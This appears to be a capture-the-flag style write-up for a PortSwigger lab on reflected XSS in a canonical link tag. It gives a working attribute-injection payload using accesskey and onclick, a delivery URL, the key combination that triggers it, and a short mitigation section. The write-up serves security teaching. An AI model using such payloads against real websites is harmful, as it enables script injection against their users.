# Lab 16 — Reflected XSS in a canonical link tag

> **Expert** · [Official lab](https://portswigger.net/web-security/canonical-link-tag)

**Entry point:** `GET /?utm_content=` — reflected inside
`<link rel="canonical" href="...">`; angle brackets are encoded.

## Solution

1. Note the canonical tag on product pages, e.g.
   `<link rel="canonical" href="https://LAB/product?productId=1&x=INJECT">`.
2. You can't break out of the attribute with quotes blocked? — quotes are
   allowed, but `<` is not, so inject attributes instead. Use `accesskey` +
   `onclick` so a keyboard shortcut triggers execution:

```
'accesskey='x'onclick='alert(1)
```

3. Deliver as:
   `/?utm_content='accesskey='x'onclick='alert(1)`
4. Trigger the key combo **ALT+SHIFT+X** (Windows/Linux) or
   **CTRL+ALT+X** (macOS) — the alert fires — lab solved.

## Mitigation

Encode quotes as well as angle brackets inside attribute contexts, and never
reflect untrusted data into `<link>`/meta tags.
